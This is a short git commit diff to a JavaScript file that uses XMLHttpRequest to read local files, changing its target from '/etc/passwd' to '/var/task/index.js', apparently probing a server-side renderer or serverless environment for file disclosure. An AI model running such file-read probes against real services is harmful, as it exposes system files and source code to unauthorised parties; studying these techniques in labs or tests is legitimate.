94902373b14a322ff00e619dd2725647a45c7435
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 18:30:08 +0200

    Update index.js

--- index.js
+++ index.js
@@ -9,5 +9,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/passwd"); 
+oReq.open("GET", "/var/task/index.js"); 
 oReq.send();
